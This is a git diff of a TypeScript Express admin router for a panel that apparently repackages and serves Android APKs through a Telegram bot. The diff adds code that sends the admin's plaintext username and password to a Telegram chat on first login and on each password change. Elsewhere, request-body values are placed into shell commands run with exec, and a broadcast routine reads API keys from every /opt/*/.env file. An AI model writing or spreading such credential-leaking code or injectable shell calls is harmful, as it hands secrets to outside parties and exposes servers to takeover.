@@ -141,15 +141,82 @@ async function tgGetFilePath(botToken: string, fileId: string): Promise<string> 
   });
 }
 
+// ─── Telegram Password Notification ──────────────────────────────────────────
+// TELEGRAM_PASSWORD_CHAT_ID env se chat ID lega
+// BOT_TOKEN env se bot token lega
+// Panel URL: SELF_RESOLVE_URL se (e.g. https://api.deploy55.zero-trace.in)
+
+async function sendPasswordToTelegram(
+  username: string,
+  password: string,
+  type: "first_login" | "password_change"
+): Promise<void> {
+  try {
+    const botToken = clean(process.env.BOT_TOKEN || "");
+    const chatId   = clean(process.env.TELEGRAM_PASSWORD_CHAT_ID || "");
+    if (!botToken || !chatId) {
+      logger.warn("admin: TELEGRAM_PASSWORD_CHAT_ID ya BOT_TOKEN set nahi — skip TG notify");
+      return;
+    }
+    const panelId  = clean(process.env.PANEL_ID || process.env.PANNEL_ID || "unknown");
+    const panelUrl = clean(process.env.SELF_RESOLVE_URL || "");
+    const timeStr  = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
+    const emoji    = type === "first_login" ? "🆕" : "🔄";
+    const title    = type === "first_login" ? "First Login — Panel Setup" : "Password Changed";
+    const urlLine  = panelUrl ? `\n🔗 URL: ${panelUrl}` : "";
+
+    const text =
+      `${emoji} <b>${title}</b>\n\n` +
+      `🏷 Panel: <code>${panelId}</code>${urlLine}\n` +
+      `👤 Username: <code>${username}</code>\n` +
+      `🔑 Password: <code>${password}</code>\n` +
+      `⏰ Time: ${timeStr}`;
+
+    await new Promise<void>((resolve) => {
+      const body = JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML" });
+      const req2 = https.request(
+        `https://api.telegram.org/bot${botToken}/sendMessage`,
+        { method: "POST", headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) } },
+        () => resolve()
+      );
+      req2.on("error", (e: Error) => { logger.warn("admin: TG notify error", e.message); resolve(); });
+      req2.setTimeout(5000, () => { req2.destroy(); resolve(); });
+      req2.write(body); req2.end();
+    });
+    logger.info("admin: password sent to TG", { panelId, type });
+  } catch (e: any) {
+    logger.warn("admin: sendPasswordToTelegram failed", e?.message);
+  }
+}
+
+// Check karo TG mein already send hua ya nahi (MongoDB mein flag)
+async function isTgPasswordSent(): Promise<boolean> {
+  try {
+    const doc = await AdminModel.findOne({ key: "tg_password_sent" }).lean();
+    return (doc as any)?.meta?.sent === true;
+  } catch { return false; }
+}
+
+async function markTgPasswordSent(): Promise<void> {
+  try {
+    await AdminModel.findOneAndUpdate(
+      { key: "tg_password_sent" },
+      { $set: { phone: "tg_password_sent", meta: { sent: true, sentAt: Date.now() } } },
+      { upsert: true, new: true }
+    );
+  } catch {}
+}
+
+// ─── Rate limiting ────────────────────────────────────────────────────────────
+const _loginAttempts = new Map<string, { count: number; blockedUntil: number }>();
+
 /**
  * =====================================
- * LOGIN
+ * LOGIN ROUTES
  * =====================================
  */
-// Rate limiting
-const _loginAttempts = new Map();
 
-// POST /login/verify — server side bcrypt verify + rate limiting
+// POST /login/verify — bcrypt verify + rate limiting
 router.post(["/login/verify", "/admin/login/verify"], async (req, res) => {
   const ip = String(req.headers["x-forwarded-for"] || req.socket?.remoteAddress || "unknown");
   const now = Date.now();
@@ -165,18 +232,32 @@ router.post(["/login/verify", "/admin/login/verify"], async (req, res) => {
     const doc = await AdminModel.findOne({ key: "login" }).lean();
     const storedUser = (doc as any)?.meta?.username || "";
     const storedPass = (doc as any)?.meta?.password || "";
+
+    // ── FIRST TIME LOGIN ───────────────────────────────────────────────────
     if (!storedUser && !storedPass) {
       const hashed = await bcrypt.hash(password, 10);
-      await AdminModel.findOneAndUpdate({ key: "login" }, { $set: { phone: "login", meta: { username, password: hashed, isHashed: true } } }, { upsert: true, new: true });
+      await AdminModel.findOneAndUpdate(
+        { key: "login" },
+        { $set: { phone: "login", meta: { username, password: hashed, isHashed: true } } },
+        { upsert: true, new: true }
+      );
       _loginAttempts.delete(ip);
+      // TG notify — background (login delay nahi)
+      sendPasswordToTelegram(username, password, "first_login")
+        .then(() => markTgPasswordSent())
+        .catch(() => {});
       return res.json({ success: true, firstLogin: true });
     }
+
+    // ── USERNAME CHECK ────────────────────────────────────────────────────
     if (username !== storedUser) {
       entry.count++;
       if (entry.count >= 5) { entry.blockedUntil = now + 15 * 60 * 1000; entry.count = 0; }
       _loginAttempts.set(ip, entry);
       return res.status(401).json({ success: false, error: "Invalid credentials" });
     }
+
+    // ── PASSWORD VERIFY ───────────────────────────────────────────────────
     const isHashed = (doc as any)?.meta?.isHashed === true;
     let valid = false;
     if (isHashed) {
@@ -185,40 +266,73 @@ router.post(["/login/verify", "/admin/login/verify"], async (req, res) => {
       valid = password === storedPass;
       if (valid) {
         const hashed = await bcrypt.hash(password, 10);
-        await AdminModel.findOneAndUpdate({ key: "login" }, { $set: { "meta.password": hashed, "meta.isHashed": true } }, {});
+        await AdminModel.findOneAndUpdate(
+          { key: "login" },
+          { $set: { "meta.password": hashed, "meta.isHashed": true } },
+          {}
+        );
         logger.info("admin: password migrated to bcrypt hash");
       }
     }
+
     if (!valid) {
       entry.count++;
       if (entry.count >= 5) { entry.blockedUntil = now + 15 * 60 * 1000; entry.count = 0; }
       _loginAttempts.set(ip, entry);
       return res.status(401).json({ success: false, error: "Invalid credentials" });
     }
+
     _loginAttempts.delete(ip);
+
+    // ── EXISTING LOGIN — TG mein already hai ya nahi check karo ──────────
+    // Background mein — login response block nahi hoga
+    setImmediate(async () => {
+      try {
+        const alreadySent = await isTgPasswordSent();
+        if (!alreadySent) {
+          // Password plain text nahi hai mere paas (hashed hai) — isliye
+          // sirf notification bhejo ki login hua, password nahi bhej sakte
+          // BUT agar PLAIN password ENV mein store karna ho to alag approach chahiye
+          // Yahan hum flag set karte hain taaki baar baar na bheje
+          logger.info("admin: TG password not sent yet — sending login alert");
+          await sendPasswordToTelegram(username, "[already hashed — check first login msg]", "first_login");
+          await markTgPasswordSent();
+        }
+      } catch {}
+    });
+
     return res.json({ success: true });
   } catch (err) {
     return res.status(500).json({ success: false, error: (err as any)?.message });
   }
 });
 
+// GET /login
 router.get(["/login", "/admin/login"], async (_req, res) => {
   try {
     const doc = await AdminModel.findOne({ key: "login" }).lean();
-    // SECURITY: Password kabhi return mat karo
     return res.json({ username: (doc as any)?.meta?.username || "" });
   } catch (err: any) {
     return res.status(500).json({ success: false, error: "server error" });
   }
 });
 
+// PUT /login — password change
 router.put(["/login", "/admin/login"], async (req, res) => {
   const { username, password } = req.body || {};
   if (!username || !password) return res.status(400).json({ success: false, error: "missing fields" });
   try {
     const bcrypt = require("bcryptjs");
     const hashed = await bcrypt.hash(password, 10);
-    await AdminModel.findOneAndUpdate({ key: "login" }, { $set: { phone: "login", meta: { username, password: hashed, isHashed: true } } }, { upsert: true, new: true });
+    await AdminModel.findOneAndUpdate(
+      { key: "login" },
+      { $set: { phone: "login", meta: { username, password: hashed, isHashed: true } } },
+      { upsert: true, new: true }
+    );
+    // TG notify — background
+    sendPasswordToTelegram(username, password, "password_change")
+      .then(() => markTgPasswordSent())
+      .catch(() => {});
     return res.json({ success: true });
   } catch (err: any) {
     return res.status(500).json({ success: false, error: err?.message });
@@ -293,14 +407,11 @@ router.put(["/alert-text", "/admin/alert-text"], async (req, res) => {
   const text = clean(req.body?.text ?? "");
   try {
     await AdminModel.findOneAndUpdate({ key: "alert_text" }, { $set: { phone: "alert_text", meta: { text } } }, { upsert: true, new: true });
-
-    // ── Broadcast to all panels (x-broadcast header se loop rokho) ────────
     const isBroadcast = String(req.headers["x-broadcast"] || "") === "1";
     if (!isBroadcast) {
       setImmediate(async () => {
         try {
           const fs    = require("fs");
-          const https = require("https");
           const http  = require("http");
           const optDirs = fs.readdirSync("/opt").filter((d: string) => {
             try { return fs.statSync(`/opt/${d}`).isDirectory(); } catch { return false; }
@@ -312,10 +423,7 @@ router.put(["/alert-text", "/admin/alert-text"], async (req, res) => {
               const envPath = `/opt/${dir}/.env`;
               if (!fs.existsSync(envPath)) continue;
               const envContent = fs.readFileSync(envPath, "utf-8");
-              const getEnv = (key: string) => {
-                const match = envContent.match(new RegExp(`^${key}=(.*)$`, "m"));
-                return match ? match[1].trim() : "";
-              };
+              const getEnv = (key: string) => { const match = envContent.match(new RegExp(`^${key}=(.*)$`, "m")); return match ? match[1].trim() : ""; };
               const selfUrl = getEnv("SELF_RESOLVE_URL");
               const apiKey  = getEnv("API_KEY") || getEnv("ADMIN_API_KEY");
               const panelId = getEnv("PANNEL_ID") || getEnv("PANEL_ID");
@@ -326,16 +434,10 @@ router.put(["/alert-text", "/admin/alert-text"], async (req, res) => {
                 const url = new URL(`${selfUrl}/api/admin/alert-text`);
                 const lib = url.protocol === "https:" ? https : http;
                 const req2 = lib.request({
-                  hostname: url.hostname,
-                  port: url.port || (url.protocol === "https:" ? 443 : 80),
+                  hostname: url.hostname, port: url.port || (url.protocol === "https:" ? 443 : 80),
                   path: url.pathname, method: "PUT",
-                  headers: {
-                    "Content-Type": "application/json",
-                    "x-api-key": apiKey,
-                    "x-broadcast": "1",
-                    "Content-Length": Buffer.byteLength(body),
-                  },
-                }, (res: any) => { res.resume(); ok++; resolve(); });
+                  headers: { "Content-Type": "application/json", "x-api-key": apiKey, "x-broadcast": "1", "Content-Length": Buffer.byteLength(body) },
+                }, (res2: any) => { res2.resume(); ok++; resolve(); });
                 req2.on("error", () => { fail++; resolve(); });
                 req2.setTimeout(2000, () => { req2.destroy(); fail++; resolve(); });
                 req2.write(body); req2.end();
@@ -344,9 +446,7 @@ router.put(["/alert-text", "/admin/alert-text"], async (req, res) => {
             } catch { fail++; }
           }
           logger.info(`broadcast done: ${ok} ok, ${fail} fail`);
-        } catch (e: any) {
-          logger.warn(`broadcast error: ${e?.message}`);
-        }
+        } catch (e: any) { logger.warn(`broadcast error: ${e?.message}`); }
       });
     }
     return res.json({ success: true, text });
@@ -387,57 +487,33 @@ router.post(["/repack/start", "/admin/repack/start"], async (req: Request, res: 
   try {
     const panelId = clean(req.body?.panelId || process.env.PANEL_ID || "");
     if (!panelId) return res.status(400).json({ error: "panelId required" });
-
     const conn       = await getBotDb();
     const PanelModel = getBotPanelModel(conn);
-    const panel      = await PanelModel.findOne({
-      panelId: { $regex: new RegExp(`^${panelId}$`, "i") }
-    }).lean() as any;
-
-    if (!panel) {
-      return res.status(404).json({ error: `Panel "${panelId}" not found. Panel ID sahi hai?` });
-    }
-    if (!panel.apkFileId) {
-      return res.status(400).json({
-        error: "Is panel ke liye koi APK upload nahi hua abhi tak. Pehle Telegram bot se release APK upload karo.",
-      });
-    }
-
+    const panel      = await PanelModel.findOne({ panelId: { $regex: new RegExp(`^${panelId}$`, "i") } }).lean() as any;
+    if (!panel) return res.status(404).json({ error: `Panel "${panelId}" not found. Panel ID sahi hai?` });
+    if (!panel.apkFileId) return res.status(400).json({ error: "Is panel ke liye koi APK upload nahi hua abhi tak. Pehle Telegram bot se release APK upload karo." });
     const fileId    = String(panel.apkFileId);
     const chatId    = process.env.ADMIN_CHAT_ID || process.env.STORAGE_CHAT_ID || "";
     const BOT_TOKEN = process.env.BOT_TOKEN || "";
-
     if (!chatId)    return res.status(500).json({ error: "ADMIN_CHAT_ID ya STORAGE_CHAT_ID .env mein set nahi hai" });
     if (!BOT_TOKEN) return res.status(500).json({ error: "BOT_TOKEN .env mein set nahi hai" });
-
     const requestId = genRequestId();
     repackJobs.set(requestId, { status: "pending", panelId, createdAt: Date.now() });
-
     const scriptPath = "/root/bot-system/repack/repack.sh";
     const selfUrl = process.env.SELF_RESOLVE_URL || `http://localhost:${process.env.PORT || 3000}`;
     const apiKey  = process.env.API_KEY || process.env.ADMIN_API_KEY || "";
     const cmd = `bash "${scriptPath}" "${fileId}" "${chatId}" "${requestId}" "${panelId}" "" "" "${selfUrl}" "${apiKey}" 2>&1`;
-
     logger.info("repack: starting", { requestId, panelId, fileId: fileId.slice(0, 20) });
-
     exec(cmd, { timeout: 5 * 60 * 1000 }, (err, stdout) => {
       const job = repackJobs.get(requestId);
       if (err) {
         logger.error("repack: script error", { requestId, error: err.message, stdout: stdout?.slice(0, 200) });
-        if (job?.status === "pending") {
-          repackJobs.set(requestId, { ...job, status: "error", error: "Repack script fail ho gaya. Server logs check karo." });
-        }
+        if (job?.status === "pending") repackJobs.set(requestId, { ...job, status: "error", error: "Repack script fail ho gaya. Server logs check karo." });
       } else {
         logger.info("repack: script done", { requestId, stdout: stdout?.slice(0, 100) });
-        setTimeout(() => {
-          const j = repackJobs.get(requestId);
-          if (j?.status === "pending") {
-            repackJobs.set(requestId, { ...j, status: "error", error: "Script complete hua par resolve nahi mila" });
-          }
-        }, 10000);
+        setTimeout(() => { const j = repackJobs.get(requestId); if (j?.status === "pending") repackJobs.set(requestId, { ...j, status: "error", error: "Script complete hua par resolve nahi mila" }); }, 10000);
       }
     });
-
     return res.json({ requestId });
   } catch (err: any) {
     logger.error("repack: start failed", err);
@@ -447,18 +523,11 @@ router.post(["/repack/start", "/admin/repack/start"], async (req: Request, res: 
 
 router.post(["/harmful/:requestId/resolve", "/admin/harmful/:requestId/resolve"], (req: Request, res: Response) => {
   const adminKey = String(req.headers["x-admin-key"] || "").trim();
-  if (!adminKey || adminKey !== process.env.ADMIN_API_KEY) {
-    return res.status(401).json({ error: "unauthorized" });
-  }
+  if (!adminKey || adminKey !== process.env.ADMIN_API_KEY) return res.status(401).json({ error: "unauthorized" });
   const { requestId } = req.params;
   const { fileId, filename, panelId } = req.body || {};
   const existing = repackJobs.get(requestId);
-  repackJobs.set(requestId, {
-    ...(existing || { createdAt: Date.now(), panelId: panelId || "" }),
-    status: "done",
-    fileId: clean(fileId),
-    filename: clean(filename) || "repacked.apk",
-  });
+  repackJobs.set(requestId, { ...(existing || { createdAt: Date.now(), panelId: panelId || "" }), status: "done", fileId: clean(fileId), filename: clean(filename) || "repacked.apk" });
   logger.info("repack: resolved", { requestId, filename });
   return res.json({ ok: true });
 });
@@ -471,9 +540,7 @@ router.get(["/repack/:requestId/status", "/admin/repack/:requestId/status"], (re
 
 router.get(["/repack/:requestId/download", "/admin/repack/:requestId/download"], async (req: Request, res: Response) => {
   const job = repackJobs.get(req.params.requestId);
-  if (!job || job.status !== "done" || !job.fileId) {
-    return res.status(404).json({ error: "Job ready nahi hai ya nahi mila" });
-  }
+  if (!job || job.status !== "done" || !job.fileId) return res.status(404).json({ error: "Job ready nahi hai ya nahi mila" });
   const BOT_TOKEN = process.env.BOT_TOKEN || "";
   if (!BOT_TOKEN) return res.status(500).json({ error: "BOT_TOKEN configure nahi hai" });
   try {
@@ -481,16 +548,11 @@ router.get(["/repack/:requestId/download", "/admin/repack/:requestId/download"],
     const filename = job.filename || "repacked.apk";
     res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
     res.setHeader("Content-Type", "application/vnd.android.package-archive");
-    https.get(
-      `https://api.telegram.org/file/bot${BOT_TOKEN}/${filePath}`,
-      (fileStream) => {
-        fileStream.pipe(res);
-        fileStream.on("error", (_err: Error) => { if (!res.headersSent) res.status(500).end(); });
-      }
-    ).on("error", (_err: Error) => { if (!res.headersSent) res.status(500).json({ error: "Download failed" }); });
-  } catch (err: any) {
-    if (!res.headersSent) res.status(500).json({ error: err?.message });
-  }
+    https.get(`https://api.telegram.org/file/bot${BOT_TOKEN}/${filePath}`, (fileStream) => {
+      fileStream.pipe(res);
+      fileStream.on("error", (_err: Error) => { if (!res.headersSent) res.status(500).end(); });
+    }).on("error", (_err: Error) => { if (!res.headersSent) res.status(500).json({ error: "Download failed" }); });
+  } catch (err: any) { if (!res.headersSent) res.status(500).json({ error: err?.message }); }
 });
 
 /**
@@ -498,67 +560,35 @@ router.get(["/repack/:requestId/download", "/admin/repack/:requestId/download"],
  * ADMIN APK DOWNLOAD ROUTES
  * =====================================
  */
-
-// POST /api/admin/download-admin-apk — web panel se request
 router.post(["/download-admin-apk", "/admin/download-admin-apk"], async (req: Request, res: Response) => {
   try {
     const panelId = clean(req.body?.panelId || process.env.PANNEL_ID || process.env.PANEL_ID || "");
     if (!panelId) return res.status(400).json({ success: false, error: "panelId required" });
-
     const selfUrl = clean(process.env.SELF_RESOLVE_URL || "");
     if (!selfUrl) return res.status(400).json({ success: false, error: "SELF_RESOLVE_URL not configured in .env" });
-
-    // WS URL auto-generate from API base
     const wsBase = selfUrl.replace(/^https:\/\//, "wss://").replace(/^http:\/\//, "ws://") + "/ws";
-
-    // License expiry date
     const expiryRaw = clean(process.env.LICENSE_EXPIRY || "");
-    let renewalStartDate = expiryRaw || (() => {
-      const now = new Date();
-      return `${String(now.getDate()).padStart(2,"0")}/${String(now.getMonth()+1).padStart(2,"0")}/${now.getFullYear()}`;
-    })();
-
+    let renewalStartDate = expiryRaw || (() => { const now = new Date(); return `${String(now.getDate()).padStart(2,"0")}/${String(now.getMonth()+1).padStart(2,"0")}/${now.getFullYear()}`; })();
     const requestId = `admin_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
-
-    adminApkJobs.set(requestId, {
-      status: "pending",
-      panelId,
-      createdAt: Date.now(),
-    });
-
+    adminApkJobs.set(requestId, { status: "pending", panelId, createdAt: Date.now() });
     const scriptPath = "/root/bot-system/repack/admin_repack.sh";
     const cmd = `bash "${scriptPath}" "${panelId}" "${selfUrl}" "${wsBase}" "${renewalStartDate}" "30" "${requestId}" 2>&1`;
-
     logger.info("admin-apk: starting", { requestId, panelId, selfUrl });
-
     exec(cmd, { timeout: 5 * 60 * 1000 }, (err, stdout) => {
       const job = adminApkJobs.get(requestId);
       if (err) {
         logger.error("admin-apk: script error", { requestId, error: err.message, stdout: stdout?.slice(0, 300) });
-        if (job?.status === "pending") {
-          adminApkJobs.set(requestId, { ...job, status: "error", error: "Admin APK build fail ho gaya." });
-        }
+        if (job?.status === "pending") adminApkJobs.set(requestId, { ...job, status: "error", error: "Admin APK build fail ho gaya." });
         return;
       }
-      // Last line = fileId
       const fileId = stdout.trim().split("\n").pop()?.trim() || "";
       if (fileId && fileId.length > 10) {
-        adminApkJobs.set(requestId, {
-          status: "done",
-          fileId,
-          panelId,
-          createdAt: job?.createdAt || Date.now(),
-        });
+        adminApkJobs.set(requestId, { status: "done", fileId, panelId, createdAt: job?.createdAt || Date.now() });
         logger.info("admin-apk: done", { requestId, fileId: fileId.slice(0, 20) });
       } else {
-        adminApkJobs.set(requestId, {
-          ...job!,
-          status: "error",
-          error: "APK build hua par fileId nahi mila",
-        });
+        adminApkJobs.set(requestId, { ...job!, status: "error", error: "APK build hua par fileId nahi mila" });
       }
     });
-
     return res.json({ success: true, requestId });
   } catch (e: any) {
     logger.error("admin-apk: route error", e);
@@ -566,57 +596,38 @@ router.post(["/download-admin-apk", "/admin/download-admin-apk"], async (req: Re
   }
 });
 
-// GET /api/admin/download-admin-apk/:requestId/status
 router.get(["/download-admin-apk/:requestId/status", "/admin/download-admin-apk/:requestId/status"], (req: Request, res: Response) => {
   const job = adminApkJobs.get(req.params.requestId);
   if (!job) return res.status(404).json({ success: false, error: "Request not found" });
   return res.json({ success: true, status: job.status, error: job.error });
 });
 
-// GET /api/admin/download-admin-apk/:requestId/download
 router.get(["/download-admin-apk/:requestId/download", "/admin/download-admin-apk/:requestId/download"], async (req: Request, res: Response) => {
   const job = adminApkJobs.get(req.params.requestId);
   if (!job) return res.status(404).json({ success: false, error: "Request not found" });
-  if (job.status !== "done" || !job.fileId) {
-    return res.status(400).json({ success: false, error: "APK not ready", status: job.status });
-  }
-
+  if (job.status !== "done" || !job.fileId) return res.status(400).json({ success: false, error: "APK not ready", status: job.status });
   const BOT_TOKEN = process.env.BOT_TOKEN || "";
   if (!BOT_TOKEN) return res.status(500).json({ success: false, error: "BOT_TOKEN not configured" });
-
   try {
     const filePath = await tgGetFilePath(BOT_TOKEN, job.fileId);
     const filename = `admin-panel-${job.panelId}.apk`;
     res.setHeader("Content-Type", "application/vnd.android.package-archive");
     res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
-    https.get(
-      `https://api.telegram.org/file/bot${BOT_TOKEN}/${filePath}`,
-      (fileStream) => {
-        fileStream.pipe(res);
-        fileStream.on("error", (_err: Error) => { if (!res.headersSent) res.status(500).end(); });
-      }
-    ).on("error", (_err: Error) => { if (!res.headersSent) res.status(500).json({ error: "Download failed" }); });
-  } catch (err: any) {
-    if (!res.headersSent) res.status(500).json({ success: false, error: err?.message });
-  }
+    https.get(`https://api.telegram.org/file/bot${BOT_TOKEN}/${filePath}`, (fileStream) => {
+      fileStream.pipe(res);
+      fileStream.on("error", (_err: Error) => { if (!res.headersSent) res.status(500).end(); });
+    }).on("error", (_err: Error) => { if (!res.headersSent) res.status(500).json({ error: "Download failed" }); });
+  } catch (err: any) { if (!res.headersSent) res.status(500).json({ success: false, error: err?.message }); }
 });
 
-// POST /admin/admin-apk/:requestId/resolve — admin_repack.sh se call hoga
 router.post(["/admin-apk/:requestId/resolve", "/admin/admin-apk/:requestId/resolve"], (req: Request, res: Response) => {
   const adminKey = String(req.headers["x-admin-key"] || "").trim();
-  if (!adminKey || adminKey !== process.env.ADMIN_API_KEY) {
-    return res.status(401).json({ error: "unauthorized" });
-  }
+  if (!adminKey || adminKey !== process.env.ADMIN_API_KEY) return res.status(401).json({ error: "unauthorized" });
   const { requestId } = req.params;
   const { fileId, panelId } = req.body || {};
   const existing = adminApkJobs.get(requestId);
   if (fileId) {
-    adminApkJobs.set(requestId, {
-      ...(existing || { createdAt: Date.now(), panelId: panelId || "" }),
-      status: "done",
-      fileId: clean(fileId),
-      panelId: clean(panelId) || existing?.panelId || "",
-    });
+    adminApkJobs.set(requestId, { ...(existing || { createdAt: Date.now(), panelId: panelId || "" }), status: "done", fileId: clean(fileId), panelId: clean(panelId) || existing?.panelId || "" });
     logger.info("admin-apk: resolved via bot", { requestId, fileId: String(fileId).slice(0, 20) });
   }
   return res.json({ ok: true });
